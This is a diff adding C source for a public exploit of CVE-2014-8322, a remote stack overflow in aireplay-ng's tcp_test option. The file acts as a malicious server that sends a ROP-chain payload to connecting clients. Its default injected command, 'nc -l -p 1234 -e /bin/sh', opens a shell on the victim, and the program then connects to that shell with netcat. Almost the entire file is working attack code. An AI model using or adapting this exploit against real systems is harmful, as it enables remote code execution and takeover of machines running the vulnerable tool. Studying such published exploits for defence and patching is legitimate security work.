@@ -1,0 +1,148 @@
+/*
+ * Exploit Title: Aireplay "tcp_test" Length Parameter Inconsistency
+ * Date: 10/3/2014
+ * Exploit Author: Nick Sampanis
+ * Vendor Homepage: http://www.aircrack-ng.org/
+ * Version: Aireplay-ng 1.2 beta3
+ * Tested on: Kali Linux 1.0.9 x64
+ * CVE : CVE-2014-8322
+ * Description: Affected option "aireplay-ng --test"
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <sys/select.h>
+#include <sys/time.h>
+#include <sys/types.h>          /* See NOTES */
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+
+#define __packed __attribute__ ((__packed__))
+struct net_hdr {
+    uint8_t     nh_type;
+    uint32_t    nh_len;
+    uint8_t     nh_data[0];
+}__packed;
+
+#define POP_RDI     "\xb8\x29\x40\x00\x00\x00\x00\x00"
+#define POP_RBX     "\x88\x92\x41\x00\x00\x00\x00\x00"
+#define RPOP_RBX    "\x00\x00\x00\x00\x00\x88\x92\x41"
+#define MOV_TO_RDI  "\xf3\x47\x41\x00\x00\x00\x00\x00"
+#define COMMAND     "nc -l -p 1234 -e /bin/sh\x00"
+#define SYSTEM      "\x50\x23\x40\x00\x00\x00\x00\x00"
+#define PAD_BYTES   1304
+
+unsigned char *exploit_init(char *command, size_t size);
+
+int main(int argc, char *argv[])
+{
+    struct net_hdr rh;
+    struct sockaddr_in server, client;
+    unsigned char *exploit;
+    socklen_t len;
+    size_t size;
+    char *command, exec[1024];
+    int sockfd, cl, val = 1;
+
+    printf("[+]Exploit for aireplay-ng tcp_test remote stack overflow\n");
+    printf("[+]Written by Nick Sampanis CVE-2014-8322\n");
+    if (argc == 1) {
+        fprintf(stderr,"[-]Usage: %s port command\n"
+                "[-][Default %s]\n", argv[0], COMMAND);
+        return -1;
+    }
+    if ((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
+        perror("[-]Socket()");
+        return -1;
+    }
+    memset((char *)&server, '\0', sizeof(server));
+    len = sizeof(server);
+    server.sin_addr.s_addr = 0;
+    server.sin_port = htons(atoi(argv[1]));
+    server.sin_family = AF_INET;
+    if (argv[2])
+        command = argv[2];
+    else
+        command = COMMAND;
+
+    setsockopt(sockfd, SOL_SOCKET,SO_REUSEADDR, &val, sizeof(val));
+    if (bind(sockfd, (struct sockaddr *)&server, sizeof(server)) == -1) {
+        perror("bind()");
+        return -1;
+    }
+    if (listen(sockfd, 5) == -1) {
+        perror("listen()");
+        return -1;
+    }
+    printf("[+]Server is waiting for connections on port %d\n", atoi(argv[1]));
+
+    if (!(size = (strlen(command)+8)*5/4*8+PAD_BYTES+sizeof(rh)))
+        return -1;
+    exploit = exploit_init(command, size);
+    while (1) {
+        if ((cl = accept(sockfd, (struct sockaddr *)&client, &len)) == -1) {
+            perror("[-]Accept");
+            return -1;
+        }
+        printf("[+]Client %s has been connected\n", inet_ntoa(client.sin_addr));
+        if (send(cl, exploit, size, 0) == -1) {
+            perror("[-]Send");
+            return -1;
+        }
+        if (recv(cl, &rh, sizeof(rh), 0) == -1) {
+            perror("[-]Recv");
+            return -1;
+        }
+        close(cl);
+        sleep(1);
+        if (!argv[2]) {
+            printf("[+]Enjoy your shell\n\n");
+            snprintf(exec, sizeof(exec), "nc %s %d", 
+                    inet_ntoa(client.sin_addr), atoi(argv[1]));
+            system(exec);
+        }
+        
+    }
+    close(sockfd);
+    free(exploit);
+
+    return 0;
+}
+
+unsigned char *exploit_init(char *command, size_t size)
+{
+    unsigned long DATA = 0x6265a0;
+    unsigned char *buffer, *exploit;
+    struct net_hdr nh;
+    register int i, j;
+
+    buffer = malloc(size);
+    nh.nh_type = 0x1;
+    nh.nh_len = htonl(size-sizeof(nh));
+    memcpy(buffer, &nh, sizeof(nh));
+    memset(buffer+sizeof(nh), 'A', PAD_BYTES);
+    exploit = buffer+sizeof(nh)+PAD_BYTES;
+
+    for (i = j = 0; j < strlen(command)+4; i+=5) {
+        memcpy(exploit+i*8, POP_RDI, 8);
+        memcpy(exploit+(i+1)*8, &DATA, 8);
+        memcpy(exploit+(i+2)*8, POP_RBX, 8);
+        memcpy(exploit+(i+3)*8, command+j, 8);
+        memcpy(exploit+(i+4)*8, MOV_TO_RDI, 8);
+        DATA += 4;
+        j += 4;
+    }
+    DATA = 0x6265a0; /*.data*/
+    memcpy(exploit+i*8, POP_RDI, 8);
+    memcpy(exploit+(i+1)*8, &DATA, 8); 
+    memcpy(exploit+(i+2)*8, SYSTEM, 8);
+
+    return buffer;
+}
+
+
